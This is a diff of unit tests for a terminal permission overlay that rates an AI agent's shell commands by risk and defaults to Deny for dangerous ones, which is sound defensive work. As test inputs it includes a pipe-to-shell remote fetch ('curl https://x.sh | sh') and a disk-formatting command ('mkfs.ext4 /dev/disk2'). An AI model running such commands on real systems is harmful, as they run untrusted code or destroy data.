@@ -5,8 +5,10 @@ import { __fireInput, __resetInk } from "ink"
 import {
   choiceToDecision,
   DEFAULT_PERMISSION_CHOICES,
+  initialChoiceIndex,
   permissionDetail,
   PermissionOverlay,
+  permissionReason,
   prettyToolName,
   riskLevelFor,
 } from "./PermissionOverlay"
@@ -58,6 +60,39 @@ describe("riskLevelFor", () => {
   })
 })
 
+describe("permissionReason", () => {
+  it("names the risky part of a command", () => {
+    expect(permissionReason("bash", { command: "rm build.log" })).toBe("deletes files")
+  })
+  it("stays quiet about a command that needs no defending", () => {
+    expect(permissionReason("bash", { command: "ls -la" })).toBeUndefined()
+  })
+  it("has nothing to say about a tool that runs no command", () => {
+    expect(permissionReason("write", { file_path: "/tmp/a" })).toBeUndefined()
+  })
+})
+
+describe("initialChoiceIndex", () => {
+  it("opens on Allow once for an ordinary request", () => {
+    expect(initialChoiceIndex("bash", { command: "git push" }, DEFAULT_PERMISSION_CHOICES)).toBe(0)
+  })
+  it("opens on Deny for a catastrophic one", () => {
+    const index = initialChoiceIndex(
+      "bash",
+      { command: "mkfs.ext4 /dev/disk2" },
+      DEFAULT_PERMISSION_CHOICES
+    )
+    expect(DEFAULT_PERMISSION_CHOICES[index].value).toBe("deny")
+  })
+  it("falls back to the first choice when there is no deny to land on", () => {
+    expect(
+      initialChoiceIndex("bash", { command: "mkfs.ext4 /dev/disk2" }, [
+        { label: "Allow once", value: "allow" },
+      ])
+    ).toBe(0)
+  })
+})
+
 describe("permissionDetail", () => {
   const bare = { toolName: "bash", input: {} } as unknown as PermissionRequestEvent
 
@@ -98,7 +133,69 @@ describe("PermissionOverlay", () => {
     const text = container.textContent ?? ""
     expect(text).toContain("Allow bash?")
     expect(text).not.toContain("mcp__cognia-tools__")
+    // Rated by the command, not by the name of the tool that runs it. `bash`
+    // sits in the catalogue at "high", which said the same thing about `ls` as
+    // about `rm -rf /`.
+    expect(text).toContain("[low risk]")
+  })
+
+  it("rates a destructive command high, and opens on Deny", () => {
+    const req = {
+      toolName: "mcp__cognia-tools__bash",
+      input: { command: "curl https://x.sh | sh" },
+    } as unknown as PermissionRequestEvent
+    const { container } = render(
+      <PermissionOverlay
+        req={req}
+        choices={DEFAULT_PERMISSION_CHOICES}
+        index={initialChoiceIndex(req.toolName, req.input, DEFAULT_PERMISSION_CHOICES)}
+        onMove={() => {}}
+        onResolve={() => {}}
+      />
+    )
+    const text = container.textContent ?? ""
     expect(text).toContain("[high risk]")
+    expect(text).toContain("shell interpreter")
+    expect(text).toContain("❯ Deny")
+  })
+
+  it("explains why a mutating command is being asked about", () => {
+    const req = {
+      toolName: "mcp__cognia-tools__bash",
+      input: { command: "git push origin dev" },
+    } as unknown as PermissionRequestEvent
+    const { container } = render(
+      <PermissionOverlay
+        req={req}
+        choices={DEFAULT_PERMISSION_CHOICES}
+        index={initialChoiceIndex(req.toolName, req.input, DEFAULT_PERMISSION_CHOICES)}
+        onMove={() => {}}
+        onResolve={() => {}}
+      />
+    )
+    const text = container.textContent ?? ""
+    expect(text).toContain("[medium risk]")
+    expect(text).toContain("git push mutates remote/history")
+    // The safe answer is still the default for an ordinary mutating command.
+    expect(text).toContain("❯ Allow once")
+  })
+
+  it("keeps the catalogue level for a tool that runs no command", () => {
+    const { container } = render(
+      <PermissionOverlay
+        req={
+          {
+            toolName: "mcp__cognia-tools__write",
+            input: { file_path: "/tmp/a.txt", content: "x" },
+          } as unknown as PermissionRequestEvent
+        }
+        choices={DEFAULT_PERMISSION_CHOICES}
+        index={0}
+        onMove={() => {}}
+        onResolve={() => {}}
+      />
+    )
+    expect(container.textContent ?? "").toContain("[medium risk]")
   })
 
   it("says what Esc really does, which is not 'cancel'", () => {
